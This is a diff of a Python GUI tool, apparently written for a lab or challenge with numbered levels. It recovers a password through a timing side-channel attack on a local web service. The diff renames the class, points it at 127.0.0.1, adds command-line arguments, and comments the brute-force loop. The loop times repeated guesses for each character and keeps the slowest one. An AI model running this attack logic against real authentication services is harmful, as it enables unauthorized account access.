@@ -1,11 +1,15 @@
 import requests
 import string
+import time
 import tkinter as tk
 from tkinter import ttk
 from numpy import mean
 import threading
+import argparse
 
-class OnEstDesBrutesGUI:
+class TimingAttackGUI:
+    """Interface graphique pour une attaque par temporisation sur un mot de passe."""
+    # Ensemble de caractères possibles pour le mot de passe
     car = string.ascii_letters + string.digits
 
     def __init__(self, level: str = '0', occ: int = 1, password: str = ''):
@@ -14,12 +18,12 @@ class OnEstDesBrutesGUI:
         self.password = password
         self.last_time = len(password) * 17
         self.password_len = 0
-        self.url = "http://192.168.137.146:5000"
+        self.url = "http://127.0.0.1:5000"
         self.running = False
         
         # Initialisation de l'interface graphique
         self.root = tk.Tk()
-        self.root.title("Timing Attack")
+        self.root.title(f"Timing Attack - Level {self.level}")
         self.root.geometry("600x400")
         
         # Frame principale
@@ -64,8 +68,10 @@ class OnEstDesBrutesGUI:
             if response.status_code == 200 and response.json().get('result', False):
                 self.log(f'Level set: {level}')
                 good = True
+                return
             else:
                 self.log(f'Erreur : {response.status_code} : {response.text}')
+            time.sleep(0.5)
 
     def request_pwd(self, letter: str):
         json = {"password": (self.password + letter).ljust(self.password_len, '0')}
@@ -99,28 +105,37 @@ class OnEstDesBrutesGUI:
             return i
 
     def brute_force_char(self):
-        time = []
-        for l in self.car:
+        time_list = []
+        for letter in self.car:
             if not self.running:
                 return None
-            time_char = []
-            for _ in range(self.occ):
-                t = -1
-                while t < self.last_time:
-                    t = self.request_pwd(l)
-                    if t is None:
-                        return None
-                    print(self.password + l, t)
-                time_char.append(t)
-            time.append(mean(time_char))
-            self.max_time_label.config(text=f"Lettre avec max temps: {self.car[time.index(max(time))]} ({max(time)}ms)")
-            
-            index = self.max_time(time)
-            if index is not None:
-                break
+            time_letter = []
 
-        self.password += self.car[time.index(max(time))]
-        self.last_time = max(time) - 15
+            # Test chaque lettre un nombre occ de fois
+            for _ in range(self.occ):
+                time_letter_in_test = -1
+
+                # Gère les erreurs de temps
+                while time_letter_in_test < self.last_time:
+                    time_letter_in_test = self.request_pwd(letter)
+                    if time_letter_in_test is None:
+                        # Mot de passe valide
+                        return None
+                    print(self.password + letter, time_letter_in_test)
+                
+                time_letter.append(time_letter_in_test)
+            
+            # Récupère la moyenne de temps de la lettre
+            time_list.append(mean(time_letter))
+            self.max_time_label.config(text=f"Lettre avec max temps: {self.car[time_list.index(max(time_list))]} ({max(time_list)}ms)")
+            
+            index = self.max_time(time_list)
+            if index is not None:
+                # Si une lettre a un timing plus élevé significativement
+                break
+        
+        self.password += self.car[time_list.index(max(time_list))]
+        self.last_time = max(time_list) - 15
         self.password_label.config(text=f"Mot de passe actuel: {self.password}")
         self.log(f'Nouveau last_time: {self.last_time}')
         return True
@@ -151,5 +166,16 @@ class OnEstDesBrutesGUI:
         self.root.mainloop()
 
 if __name__ == "__main__":
-    app = OnEstDesBrutesGUI(level='2', occ=4, password='Crab')
+    parser = argparse.ArgumentParser(description='Traitement des arguments.')
+    parser.add_argument('--level', type=int, required=True, help='Niveau (doit être un int)', default=0)
+    parser.add_argument('--occurrence', type=int, required=False, help='Occurrence de chaque caractère (doit être un int)', default=1)
+    parser.add_argument('--password', type=str, required=False, help='Mot de passe (doit être un str)', default='')
+
+    args = parser.parse_args()
+
+    niveau = str(args.level)
+    occurrence = args.occurrence
+    password = args.password
+
+    app = TimingAttackGUI(level=niveau, occ=occurrence, password=password)
     app.run()
